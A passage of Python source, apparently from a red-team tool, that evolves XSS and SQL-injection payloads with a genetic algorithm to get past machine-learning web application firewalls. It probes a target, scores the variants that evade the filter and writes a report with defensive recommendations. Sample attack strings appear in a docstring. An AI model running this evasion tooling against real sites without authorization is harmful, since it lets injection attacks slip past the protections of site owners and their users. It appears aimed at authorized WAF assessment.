        preserved = self._perturbation.verify_semantic_preservation(
            individual.original_payload, individual.mutated_payload, context
        )
        individual.semantic_preserved = preserved
        if preserved:
            fitness += 3.0
        else:
            fitness -= 5.0  # Heavy penalty for broken semantics

        # 3. Feature distance from original
        if individual.original_payload != individual.mutated_payload:
            orig_features = self._analyzer.extract_features(individual.original_payload)
            mut_features = self._analyzer.extract_features(individual.mutated_payload)
            distance = self._analyzer.compute_euclidean_distance(
                orig_features.feature_vector_raw, mut_features.feature_vector_raw
            )
            # Moderate distance is good (too far = likely broken)
            if 1.0 <= distance <= 15.0:
                fitness += distance * 0.3
            elif distance > 15.0:
                fitness += 4.5 - (distance - 15.0) * 0.1  # Diminishing returns

            individual.feature_delta = self._analyzer.compute_feature_delta(
                individual.original_payload, individual.mutated_payload
            )

        # 4. Perturbation efficiency
        n_perts = len(individual.perturbations_applied)
        if n_perts > 0:
            efficiency = 1.0 / math.sqrt(n_perts)
            fitness += efficiency * 2.0

        # 5. Length penalty
        orig_len = len(individual.original_payload)
        mut_len = len(individual.mutated_payload)
        if orig_len > 0:
            length_ratio = mut_len / orig_len
            if length_ratio > 5.0:
                fitness -= (length_ratio - 5.0) * 0.5

        return round(max(fitness, 0.0), 4)

    def _tournament_select(self) -> AdversarialPayload:
        """Select an individual using tournament selection."""
        tournament = random.sample(
            self._population,
            min(self._tournament_size, len(self._population)),
        )
        return max(tournament, key=lambda x: x.fitness_score)

    def _crossover(
        self,
        parent_a: AdversarialPayload,
        parent_b: AdversarialPayload,
        base_payload: str,
        context: PayloadContext,
    ) -> AdversarialPayload:
        """Create offspring by combining perturbations from two parents."""
        # Combine perturbation types from both parents
        all_perts_a = list(parent_a.perturbation_types)
        all_perts_b = list(parent_b.perturbation_types)

        # Single-point crossover on perturbation lists
        if all_perts_a and all_perts_b:
            cut_a = random.randint(0, len(all_perts_a))
            cut_b = random.randint(0, len(all_perts_b))
            child_perts = all_perts_a[:cut_a] + all_perts_b[cut_b:]
        elif all_perts_a:
            child_perts = all_perts_a[:]
        elif all_perts_b:
            child_perts = all_perts_b[:]
        else:
            child_perts = []

        # Limit perturbation count
        if len(child_perts) > MAX_PERTURBATION_DEPTH:
            child_perts = random.sample(child_perts, MAX_PERTURBATION_DEPTH)

        # Apply perturbations to base payload
        mutated = base_payload
        for pert in child_perts:
            mutated = self._perturbation.apply(mutated, pert)

        child = AdversarialPayload(
            original_payload=base_payload,
            mutated_payload=mutated,
            perturbations_applied=[p.name for p in child_perts],
            perturbation_types=child_perts,
            generation=self._generation,
            context=context,
            parent_ids=[parent_a.payload_id, parent_b.payload_id],
            mutation_history=[{
                "type": "crossover",
                "parents": [parent_a.payload_id, parent_b.payload_id],
                "generation": self._generation,
            }],
        )

        return child

    def _mutate(
        self,
        individual: AdversarialPayload,
        base_payload: str,
        context: PayloadContext,
    ) -> AdversarialPayload:
        """Mutate an individual by adding, removing, or replacing perturbations."""
        mutation_type = random.choice(["add", "remove", "replace", "swap"])
        current_perts = list(individual.perturbation_types)
        all_techniques = self._perturbation.get_all_techniques()

        if mutation_type == "add" and len(current_perts) < MAX_PERTURBATION_DEPTH:
            new_pert = random.choice(all_techniques)
            insert_pos = random.randint(0, len(current_perts))
            current_perts.insert(insert_pos, new_pert)

        elif mutation_type == "remove" and current_perts:
            remove_idx = random.randint(0, len(current_perts) - 1)
            current_perts.pop(remove_idx)

        elif mutation_type == "replace" and current_perts:
            replace_idx = random.randint(0, len(current_perts) - 1)
            current_perts[replace_idx] = random.choice(all_techniques)

        elif mutation_type == "swap" and len(current_perts) >= 2:
            i, j = random.sample(range(len(current_perts)), 2)
            current_perts[i], current_perts[j] = current_perts[j], current_perts[i]

        # Re-apply all perturbations to base payload
        mutated = base_payload
        for pert in current_perts:
            mutated = self._perturbation.apply(mutated, pert)

        mutant = AdversarialPayload(
            original_payload=base_payload,
            mutated_payload=mutated,
            perturbations_applied=[p.name for p in current_perts],
            perturbation_types=current_perts,
            generation=self._generation,
            context=context,
            parent_ids=[individual.payload_id],
            mutation_history=individual.mutation_history + [{
                "type": f"mutation_{mutation_type}",
                "generation": self._generation,
            }],
        )

        return mutant

    def _next_generation(
        self, base_payload: str, context: PayloadContext
    ) -> List[AdversarialPayload]:
        """Create the next generation through selection, crossover, and mutation."""
        new_pop: List[AdversarialPayload] = []

        # Elitism: keep top individuals
        sorted_pop = sorted(self._population, key=lambda x: x.fitness_score, reverse=True)
        elite_count = max(1, int(len(self._population) * self._elite_ratio))
        elites = sorted_pop[:elite_count]

        for elite in elites:
            elite_copy = AdversarialPayload(
                payload_id=elite.payload_id,
                original_payload=elite.original_payload,
                mutated_payload=elite.mutated_payload,
                perturbations_applied=list(elite.perturbations_applied),
                perturbation_types=list(elite.perturbation_types),
                generation=self._generation,
                fitness_score=elite.fitness_score,
                evasion_success=elite.evasion_success,
                semantic_preserved=elite.semantic_preserved,
                context=elite.context,
                parent_ids=list(elite.parent_ids),
                mutation_history=list(elite.mutation_history),
                waf_responses=list(elite.waf_responses),
            )
            new_pop.append(elite_copy)

        # Fill rest with crossover and mutation
        while len(new_pop) < self._population_size:
            if random.random() < self._crossover_rate and len(self._population) >= 2:
                parent_a = self._tournament_select()
                parent_b = self._tournament_select()
                child = self._crossover(parent_a, parent_b, base_payload, context)
            else:
                parent = self._tournament_select()
                child = AdversarialPayload(
                    original_payload=parent.original_payload,
                    mutated_payload=parent.mutated_payload,
                    perturbations_applied=list(parent.perturbations_applied),
                    perturbation_types=list(parent.perturbation_types),
                    generation=self._generation,
                    context=parent.context,
                    parent_ids=[parent.payload_id],
                )

            # Apply mutation
            if random.random() < self._mutation_rate:
                child = self._mutate(child, base_payload, context)

            new_pop.append(child)

        return new_pop[:self._population_size]

    def _inject_diversity(
        self, base_payload: str, context: PayloadContext
    ) -> None:
        """Inject fresh random individuals to escape local optima."""
        n_inject = max(3, self._population_size // 5)
        techniques = self._perturbation.get_all_techniques()

        # Replace worst individuals
        self._population.sort(key=lambda x: x.fitness_score)

        for i in range(min(n_inject, len(self._population))):
            n_perts = random.randint(2, 6)
            selected = random.sample(techniques, min(n_perts, len(techniques)))

            mutated = base_payload
            applied: List[str] = []
            types: List[PerturbationType] = []

            for pert in selected:
                mutated = self._perturbation.apply(mutated, pert)
                applied.append(pert.name)
                types.append(pert)

            new_individual = AdversarialPayload(
                original_payload=base_payload,
                mutated_payload=mutated,
                perturbations_applied=applied,
                perturbation_types=types,
                generation=self._generation,
                context=context,
                mutation_history=[{"type": "diversity_injection", "generation": self._generation}],
            )

            self._population[i] = new_individual

    def get_best_payload(self) -> Optional[AdversarialPayload]:
        """Get the best payload found so far."""
        with self._lock:
            if self._evasions_found:
                return max(self._evasions_found, key=lambda x: x.fitness_score)
            if self._population:
                return max(self._population, key=lambda x: x.fitness_score)
            return None

    def get_all_evasions(self) -> List[AdversarialPayload]:
        """Get all successful evasion payloads found."""
        with self._lock:
            return list(self._evasions_found)

    def get_evolution_stats(self) -> Dict[str, Any]:
        """Get genetic algorithm evolution statistics."""
        with self._lock:
            return {
                "generations_completed": self._generation,
                "total_evaluations": self._total_evaluations,
                "evasions_found": len(self._evasions_found),
                "population_size": len(self._population),
                "best_fitness_ever": self._best_fitness_ever,
                "stagnation_counter": self._stagnation_counter,
                "fitness_history": list(self._fitness_history[-20:]),
                "perturbation_success_rates": self._perturbation.get_success_rates(),
            }


# ════════════════════════════════════════════════════════════════════════════════
# SIREN ADVERSARIAL ML — ORCHESTRATOR
# ════════════════════════════════════════════════════════════════════════════════


class SirenAdversarialML:
    """
    Orchestrates end-to-end adversarial ML-based WAF evasion assessment.

    Coordinates FeatureAnalyzer, MLModelProber, PerturbationEngine,
    and EvasionGenerator for comprehensive ML WAF bypass testing.

    Pipeline:
        1. Feature extraction — reverse-engineer WAF ML features
        2. Model probing — infer decision boundaries via black-box probing
        3. Perturbation — apply 40+ semantic-preserving mutations
        4. Genetic evolution — evolve payloads past ML classifiers
        5. Analysis — cross-vendor transfer attack viability

    Usage::

        engine = SirenAdversarialML()
        report = engine.full_evasion(
            target="https://target.com",
            blocked_payloads=["<script>alert(1)</script>", "' OR 1=1 --"],
            waf_vendor=WAFVendor.CLOUDFLARE,
        )
    """

    def __init__(
        self,
        probe_fn: Optional[Callable[[str], ProbeResult]] = None,
        population_size: int = 60,
        mutation_rate: float = 0.15,
    ) -> None:
        self._lock = threading.RLock()

        # Sub-engines
        self._features = FeatureAnalyzer()
        self._prober = MLModelProber(
            probe_fn=probe_fn, feature_analyzer=self._features,
        )
        self._perturbation = PerturbationEngine(feature_analyzer=self._features)
        self._evolution = EvasionGenerator(
            probe_fn=probe_fn,
            perturbation_engine=self._perturbation,
            feature_analyzer=self._features,
            population_size=population_size,
            mutation_rate=mutation_rate,
        )

        # State
        self._evasion_results: List[EvasionResult] = []
        self._successful_evasions: List[AdversarialPayload] = []
        self._boundaries: List[DecisionBoundary] = []
        self._feature_analyses: Dict[str, FeatureVector] = {}
        self._scan_phases: List[Dict[str, Any]] = []
        self._scan_start: float = 0.0
        self._scan_end: float = 0.0

        logger.info("SirenAdversarialML initialized (pop=%d, mutation=%.2f)",
                     population_size, mutation_rate)

    # ── Phase 1: Feature Analysis ────────────────────────────────────────

    def analyze_features(self, payloads: List[str]) -> Dict[str, FeatureVector]:
        """Extract and analyze ML features from blocked payloads."""
        with self._lock:
            t0 = time.time()
            results: Dict[str, FeatureVector] = {}

            for payload in payloads:
                fv = self._features.extract_features(payload)
                results[payload[:80]] = fv
                dominant = self._features.get_dominant_features(fv, top_n=5)
                logger.debug(
                    "Features for '%s...': dominant=%s",
                    payload[:30], [(n, round(v, 3)) for n, v in dominant],
                )

            self._feature_analyses.update(results)
            self._scan_phases.append({
                "phase": "feature_analysis",
                "duration": time.time() - t0,
                "payloads_analyzed": len(payloads),
            })
            logger.info("Phase 1: Analyzed features of %d payloads", len(payloads))
            return results

    # ── Phase 2: Model Probing ───────────────────────────────────────────

    def probe_model(
        self, base_payloads: List[str], perturbation_steps: int = 50
    ) -> List[DecisionBoundary]:
        """Probe WAF ML model decision boundaries."""
        with self._lock:
            t0 = time.time()
            boundaries: List[DecisionBoundary] = []

            for payload in base_payloads:
                boundary = self._prober.infer_decision_boundary(
                    payload, perturbation_steps=perturbation_steps,
                )
                if boundary:
                    boundaries.append(boundary)

            self._boundaries.extend(boundaries)
            self._scan_phases.append({
                "phase": "model_probing",
                "duration": time.time() - t0,
                "boundaries_found": len(boundaries),
            })
            logger.info("Phase 2: Found %d decision boundaries", len(boundaries))
            return boundaries

    # ── Phase 3: Perturbation Testing ────────────────────────────────────

    def test_perturbations(
        self, payloads: List[str]
    ) -> List[EvasionResult]:
        """Apply all perturbation techniques and evaluate effectiveness."""
        with self._lock:
            t0 = time.time()
            results: List[EvasionResult] = []

            for payload in payloads:
                perturbed_map = self._perturbation.apply_all(payload)

                for pert_type, mutated in perturbed_map.items():
                    if mutated != payload:
                        # Probe mutated payload
                        probe = self._prober.probe(mutated)

                        evasion = EvasionResult(
                            original_payload=payload,
                            evasion_payload=mutated,
                            perturbation_type=pert_type,
                            original_blocked=True,
                            evasion_blocked=probe.blocked if probe else True,
                            confidence_change=probe.confidence - 0.9 if probe and hasattr(probe, 'confidence') else 0.0,
                            feature_delta=self._features.compute_feature_delta(payload, mutated),
                        )
                        results.append(evasion)

                        if probe and not probe.blocked:
                            self._successful_evasions.append(AdversarialPayload(
                                original_payload=payload,
                                mutated_payload=mutated,
                                perturbations_applied=[pert_type.name],
                                perturbation_types=[pert_type],
                            ))

            self._evasion_results.extend(results)
            self._scan_phases.append({
                "phase": "perturbation_testing",
                "duration": time.time() - t0,
                "results": len(results),
                "evasions": sum(1 for r in results if not r.evasion_blocked),
            })
            logger.info("Phase 3: Tested perturbations, %d results", len(results))
            return results

    # ── Phase 4: Genetic Evolution ───────────────────────────────────────

    def evolve_payloads(
        self,
        blocked_payloads: List[str],
        context: PayloadContext = PayloadContext.GENERIC,
        max_generations: int = 200,
        target_evasions: int = 5,
    ) -> List[AdversarialPayload]:
        """Run genetic algorithm to evolve evasion payloads."""
        with self._lock:
            t0 = time.time()
            all_evasions: List[AdversarialPayload] = []

            for payload in blocked_payloads:
                evasions = self._evolution.evolve(
                    payload,
                    context=context,
                    max_generations=max_generations,
                    target_evasions=target_evasions,
                )
                all_evasions.extend(evasions)

            self._successful_evasions.extend(all_evasions)
            self._scan_phases.append({
                "phase": "genetic_evolution",
                "duration": time.time() - t0,
                "payloads_evolved": len(blocked_payloads),
                "evasions_found": len(all_evasions),
                "stats": self._evolution.get_evolution_stats(),
            })
            logger.info("Phase 4: Evolved %d evasion payloads", len(all_evasions))
            return all_evasions

    # ── Report Generation ────────────────────────────────────────────────

    def generate_report(
        self,
        target: str = "",
        waf_vendor: WAFVendor = WAFVendor.UNKNOWN,
    ) -> EvasionReport:
        """Generate consolidated adversarial ML evasion report."""
        with self._lock:
            total_tested = len(self._evasion_results)
            total_evasions = len(self._successful_evasions)
            evasion_rate = round(
                total_evasions / max(total_tested, 1) * 100, 2
            ) if total_tested else 0.0

            # Strategy success rates
            strategy_rates: Dict[str, float] = {}
            by_pert: Dict[str, List[bool]] = defaultdict(list)
            for r in self._evasion_results:
                name = r.perturbation_type.name if hasattr(r, 'perturbation_type') and r.perturbation_type else "unknown"
                by_pert[name].append(not r.evasion_blocked)
            for name, successes in by_pert.items():
                strategy_rates[name] = round(
                    sum(successes) / max(len(successes), 1) * 100, 2
                )

            # Perturbation effectiveness
            pert_eff: Dict[str, float] = {}
            for name, successes in by_pert.items():
                pert_eff[name] = round(sum(successes) / max(len(successes), 1), 4)

            inferred_type = self._prober.infer_model_type() if total_tested > 0 else "unknown"

            # Inferred features
            inferred_features = []
            for key, fv in self._feature_analyses.items():
                dominant = self._features.get_dominant_features(fv, top_n=3)
                for feat_name, _ in dominant:
                    if feat_name not in inferred_features:
                        inferred_features.append(feat_name)

            recommendations = []
            if evasion_rate > 30:
                recommendations.append("WAF ML model is highly vulnerable to adversarial perturbations — consider retraining")
            if evasion_rate > 10:
                recommendations.append("Implement ensemble detection (multiple ML models + signature-based)")
            recommendations.append("Add adversarial training samples from discovered evasion payloads")
            recommendations.append("Implement input normalization before ML classification")
            if any("unicode" in e.name.lower() for e in PerturbationType):
                recommendations.append("Add Unicode normalization to preprocessing pipeline")

            report = EvasionReport(
                target=target,
                waf_vendor=waf_vendor,
                total_payloads_tested=total_tested,
                total_evasions_found=total_evasions,
                evasion_rate=evasion_rate,
                strategies_success_rate=strategy_rates,
                successful_evasions=[
                    EvasionResult(
                        original_payload=e.original_payload,
                        evasion_payload=e.mutated_payload,
                        original_blocked=True,
                        evasion_blocked=False,
                    ) for e in self._successful_evasions[:50]
                ],
                inferred_model_type=inferred_type,
                inferred_features=inferred_features[:20],
                perturbation_effectiveness=pert_eff,
                recommendations=recommendations,
                duration_seconds=self._scan_end - self._scan_start if self._scan_end else 0.0,
                start_time=self._scan_start,
                end_time=self._scan_end,
                genetic_evolution_stats=self._evolution.get_evolution_stats(),
            )

            logger.info(
                "Adversarial ML report: %d tested, %d evasions (%.1f%%), model=%s",
                total_tested, total_evasions, evasion_rate, inferred_type,
            )
            return report

    # ── Full Evasion Pipeline ────────────────────────────────────────────

    def full_evasion(
        self,
        target: str,
        blocked_payloads: List[str],
        waf_vendor: WAFVendor = WAFVendor.UNKNOWN,
        context: PayloadContext = PayloadContext.GENERIC,
        max_generations: int = 200,
        target_evasions: int = 5,
    ) -> EvasionReport:
        """
        Execute full adversarial ML evasion assessment.

        Phases:
            1. Feature analysis of blocked payloads
            2. Model probing and boundary inference
            3. Perturbation testing
            4. Genetic evolution
            5. Report generation
        """
        with self._lock:
            self._scan_start = time.time()

        # Phase 1: Feature analysis
        self.analyze_features(blocked_payloads)

        # Phase 2: Model probing
        self.probe_model(blocked_payloads[:5])

        # Phase 3: Perturbation testing
        self.test_perturbations(blocked_payloads)

        # Phase 4: Genetic evolution
        self.evolve_payloads(
            blocked_payloads,
            context=context,
            max_generations=max_generations,
            target_evasions=target_evasions,
        )

        with self._lock:
            self._scan_end = time.time()

        # Phase 5: Report
        return self.generate_report(target=target, waf_vendor=waf_vendor)

    # ── Accessors ────────────────────────────────────────────────────────

    def get_evasions(self) -> List[AdversarialPayload]:
        with self._lock:
            return list(self._successful_evasions)

    def get_best_evasion(self) -> Optional[AdversarialPayload]:
        with self._lock:
            best = self._evolution.get_best_payload()
            return best

    def reset(self) -> None:
        """Reset all evasion state."""
        with self._lock:
            self._evasion_results.clear()
            self._successful_evasions.clear()
            self._boundaries.clear()
            self._feature_analyses.clear()
            self._scan_phases.clear()
            self._scan_start = 0.0
            self._scan_end = 0.0
            logger.info("SirenAdversarialML state reset")

    def to_dict(self) -> Dict[str, Any]:
        """Serialize orchestrator state."""
        with self._lock:
            return {
                "evasion_results": len(self._evasion_results),
                "successful_evasions": len(self._successful_evasions),
                "boundaries_mapped": len(self._boundaries),
                "features_analyzed": len(self._feature_analyses),
                "phases": list(self._scan_phases),
                "evolution_stats": self._evolution.get_evolution_stats(),
                "duration": self._scan_end - self._scan_start if self._scan_end else 0.0,
            }
